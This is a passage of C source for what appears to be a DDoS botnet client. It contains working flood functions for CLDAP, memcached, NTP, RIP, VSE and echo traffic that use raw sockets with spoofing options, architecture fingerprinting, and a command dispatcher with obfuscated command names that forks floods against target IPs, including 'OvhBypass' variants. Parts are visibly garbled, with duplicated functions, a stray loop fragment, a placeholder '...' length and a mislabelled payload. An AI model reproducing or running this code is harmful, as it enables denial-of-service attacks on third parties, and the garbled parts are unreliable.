 * decodes a string using a custom encoding scheme
 *
 * @param str string to decode
 * @return decoded string
 */
char *decode(char *str) {
    int x = 0, i = 0, c;

    memset(decoded, 0, sizeof(decoded));
    while (x < strlen(str)) {
        for (c = 0; c < sizeof(encodes); c++) {
            if (str[x] == encodes[c]) {
                decoded[i] = decodes[c];
                i++;
                break; // break the loop once a match is found
            }
        }
        x++;
    }
    decoded[i] = '\0';

    return decoded;
}
/**
 * Constructs a CLDAP packet
 *
 * @param iph Pointer to the IP header structure
 * @param dest Destination IP address
 * @param source Source IP address
 * @param protocol IP protocol
 * @param packetSize Size of the payload
 */
void makecldappacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    // CLDAP Payload
    char *cldap_payload = "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00";
    int cldap_payload_len = 49; // Length of the CLDAP payload

    // Constructing the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + cldap_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * Performs a CLDAP attack on a target IP address.
 *
 * @param target Target IP address as a string.
 * @param port Target port number.
 * @param timeEnd Duration to send packets in seconds.
 * @param spoofit IP spoofing level.
 * @param packetsize Size of each packet.
 * @param pollinterval Interval to change the port.
 * @param sleepcheck Interval to sleep.
 * @param sleeptime Sleep time in milliseconds.
 */
void cldapattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    int sockfd;
    if (spoofit == 32) {
        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    } else {
        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    }
    if (sockfd < 0) {
        return; // check if socket creation was successful
    }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = (port == 0) ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return; // check if hostname resolution was successful
    memset(dest_addr.sin_zero, '\0', sizeof(dest_addr.sin_zero));

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return; // check for malloc failure
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0; ; ) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (i++ == pollinterval) {
            dest_addr.sin_port = (port == 0) ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break; // exit loop after the specified duration
            i = 0;
        }
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000); // sleep for specified time
            ii = 0;
        }
    }
    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with a memcached payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makemempacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a";
    int mem_payload_len = 15; // length of the memcached payload

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + mem_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs a memcached attack on a target ip address
 *
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void memattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    char *mem_payload;
    int mem_payload_len;
    mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a";
    mem_payload_len = 15; // length of mem payload

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return; // hostname resolution check
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd;
    if (spoofit == 32) {
        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    } else {
        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
            close(sockfd);
            return;
        }
    }
    if (!sockfd) {
        return; // socket creation check
    }

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return; // memory allocation check
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0; ; ) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break; // timing check
            i = 0;
        }
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000); // sleep for sleeptime
            ii = 0;
        }
    }
    free(buf);
    close(sockfd);
}

/**
 * constructs a packet with an ntp payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makentppacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a";
    int ntp_payload_len = 97; // length of the ntp payload

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + ntp_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs an ntp attack on a target ip address
 *
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void ntpattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    char *ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a";
    int ntp_payload_len = 97;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = (spoofit == 32) ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (i++ == pollinterval) {
            if (port == 0) dest_addr.sin_port = rand_cmwc();
            if (time(NULL) > end) break;
            i = 0;
        }
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with a rip payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makerippacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *rip_payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10";
    int rip_payload_len = 24;

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + rip_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs a rip attack on a target ip address
 * sets up socket and payload, then sends packets in a loop
 * either using udp (if spoofit is 32) or raw sockets
 *
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void ripattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    char *rip_payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10";
    int rip_payload_len = 24;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = (spoofit == 32) ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (i++ == pollinterval) {
            if (port == 0) dest_addr.sin_port = rand_cmwc();
            if (time(NULL) > end) break;
            i = 0;
        }
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with an extended payload
 * the payload and length are hardcoded
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makextdpacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    int xtd_payload_len = 220; // approximated length of the xtd_payload

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + xtd_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs an xtd attack on a target ip address
 * 
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
/**
 * performs an xtd attack on a target ip address
 * 
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void xtdattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    // define the payload and its length
    char *xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e..."; // truncated for brevity
    int xtd_payload_len = ...; // actual length of xtd_payload

    // set up destination address structure
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;

    // create socket based on spoofing parameter
    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    // buffer for sending packets
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }

    // main loop for sending packets
    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        // send packet
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        // handle poll interval
        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break;
            i = 0;
        }

        // sleep check
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    // clean up
    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with a vse payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    // define the payload and its length
    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
    int vse_payload_len = 20;

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs a vse attack on a target ip address
 *
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
    int vse_payload_len = 20;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break;
            i = 0;
        }

        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    free(buf);
    close(sockfd);
}

    // main loop for sending packets
    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        // send packet
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        // handle poll interval
        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break;
            i = 0;
        }

        // sleep check
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    // clean up
    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with a vse payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    // define the payload and its length
    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
    int vse_payload_len = 20;

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}

/**
 * constructs a packet with an echo payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makeechopacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *echo_payload = "\x0D\x0A\x0D\x0A";
    int echo_payload_len = 4;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + echo_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs an echo attack on a target ip address
 * 
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void echoattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    // define the payload and its length
    char *echo_payload = "\x0D\x0A\x0D\x0A";
    int echo_payload_len = 4; // actual length of echo_payload

    // set up destination address structure
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;

    // create socket based on spoofing parameter
    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    // buffer for sending packets
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }

    // main loop for sending packets
    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        // send packet
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        // handle poll interval
        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break;
            i = 0;
        }

        // sleep check
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    // clean up
    free(buf);
    close(sockfd);
}
/**
 * establishes a TCP connection to a given host and port
 * 
 * @param host hostname or ip address to connect
 * @param port port number to connect
 * @return socket descriptor if successful, 0 otherwise
 */
int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;

    // resolving the host name
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);

    // setting up socket address structure
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    // creating socket
    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock == -1) return 0;

    // setting socket options
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

    // establishing connection
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;

    return sock;
}
/**
 * returns the architecture type as a string
 * checks various predefined macros to determine the architecture
 */
char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64"; // for 64-bit x86 architecture
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32"; // for 32-bit x86 architecture
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";   // for ARM v4 architecture
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5";   // for ARM v5 architecture
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";   // for ARM v6 architecture
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";   // for ARM v7 architecture
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";   // for MIPS architecture
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "Mipsel"; // for MIPS (little-endian) architecture
    #elif defined(__sh__)
    return "Sh4";    // for SuperH architecture
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";    // for PowerPC architecture
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";    // for SPARC architecture
    #elif defined(__m68k__)
    return "M68k";   // for Motorola 68k architecture
    #elif defined(__arc__)
    return "Arc";    // for ARC architecture
    #else
    return "Unknown Architecture"; // if none of the above
    #endif
}
/**
 * returns a port number as a string based on available programs
 * checks for the existence of certain programs and returns a specific port
 */
char *getPorts() {
    // Check for Python, Perl, and Telnetd. If any exist, return port "22"
    if (access("/usr/bin/python", F_OK) != -1) {
        return "22";
    }
    if (access("/usr/bin/python3", F_OK) != -1) {
        return "22";
    }
    if (access("/usr/bin/perl", F_OK) != -1) {
        return "22";
    }
    if (access("/usr/sbin/telnetd", F_OK) != -1) {
        return "22";
    }

    // If none of the above programs exist, return "Unknown Port"
    return "unknown port";
}
void processCmd(int argc, unsigned char *argv[]) {
    // handling the "Tard UDP" command
    if (!strcmp(argv[0], decode("1-|"))) { // UDP ip port time
        if (argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1) { 
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = 32;
        int packetsize = 10000;
        int pollinterval = 10;
        int sleepcheck = 1000000;
        int sleeptime = 0;
        if (strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    k2o_BB2(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {
                k2o_BB2(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
    }

    // command for STD attack
    if(!strcmp(argv[0], decode("6c-"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendSTD(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendSTD(ip, port, time);
            _exit(0);
        }
    }

    // command for Zgo attack
    if(!strcmp(argv[0], decode("@<j"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendZgo(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendZgo(ip, port, time);
            _exit(0);
        }
    }

    // command for ZDP attack
    if(!strcmp(argv[0], decode("@-|"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendZDP(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendZDP(ip, port, time);
            _exit(0);
        }
    }

    // command for OvhBypassOne attack
    if(!strcmp(argv[0], decode(",dj"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendOvhBypassOne(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendOvhBypassOne(ip, port, time);
            _exit(0);
        }
    }

    // command for OvhBypassTwo attack
    if(!strcmp(argv[0], "OVH")){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendOvhBypassTwo(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendOvhBypassTwo(ip, port, time);
            _exit(0);
        }
    }

    // command for OvhBypassThree attack
    if(!strcmp(argv[0], decode("jge"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
